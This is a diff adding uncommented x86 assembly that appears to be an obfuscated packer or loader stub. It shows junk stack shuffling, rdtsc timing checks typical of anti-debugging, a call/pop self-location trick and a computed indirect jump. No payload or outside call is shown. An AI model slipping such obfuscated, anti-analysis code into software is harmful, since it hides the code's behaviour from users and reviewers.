@@ -1,0 +1,94 @@
+pushad  
+push   ESI
+mov    dword ptr [ESP],$491
+push   EDX
+mov    dword ptr [ESP],$01044A9E
+push   EAX
+push   EDX
+mov    dword ptr [ESP],$15093EB5
+mov    dword ptr [ESP],EAX
+mov    dword ptr [ESP],EBX
+mov    EAX,dword ptr [ESP+$10]
+mov    EBX,dword ptr [ESP+8]
+mov    dword ptr [ESP+$8],EAX
+mov    dword ptr [ESP+$10],EBX
+pop    EBX
+pop    EAX
+jmp    $10BC7796
+push   EAX
+push   EDX
+jmp    $10BC77A5
+rdtsc  
+jmp    $10BC77B2
+push   EDX
+pushad  
+popad  
+push   EAX
+push   EDX
+rdtsc  
+pop    EDX
+pop    EAX
+pop    EDX
+pop    EDX
+pop    EAX
+jmp    $10BC77D0
+push   EAX
+push   ECX
+push   EDX
+push   EBX
+push   EBX
+push   EBP
+push   ESI
+push   EDI
+call   $10BC787B
+pop    ECX
+sub    ECX,$0E5
+sub    ECX,$00BC7796
+mov    EBP,$00A8B074
+add    EBP,ECX
+push   ECX
+mov    ECX,1
+mov    EBX,$62
+xor    EAX,EAX
+lock  cmpxchg  dword ptr [EBP+EBX],ECX
+je     $10BC79E1
+pop    ECX
+mov    EBX,$89
+mov    dword ptr [EBP+EBX],ECX
+mov    EBX,$39
+push   EDI
+mov    EDI,$10000000
+push   EDX
+mov    EDX,EBX
+add    EDX,0
+add    EDX,EBP
+mov    dword ptr [EDX],EDI
+pop    EDX
+pop    EDI
+mov    EBX,$51
+mov    EAX,dword ptr [ESP+$28]
+add    EAX,ECX
+push   ECX
+mov    ECX,EBX
+add    ECX,0
+add    ECX,EBP
+mov    dword ptr [ECX],EAX
+pop    ECX
+mov    EAX,$00BC63D2
+add    EAX,ECX
+mov    EBX,$0AD
+mov    EDX,dword ptr [EBP+EBX]
+cmp    EDX,EAX
+je     $10BC7D57
+push   EBX
+mov    EBX,$4F1
+push   EAX
+test   EBX,EBX
+je     $10BC7CF2
+pop    EAX
+pop    EBX
+mov    dword ptr [EBP+EBX],EAX
+mov    EBX,dword ptr [ESP+24]
+shl    EBX,2
+add    EAX,EBX
+jmp    dword ptr [EAX]
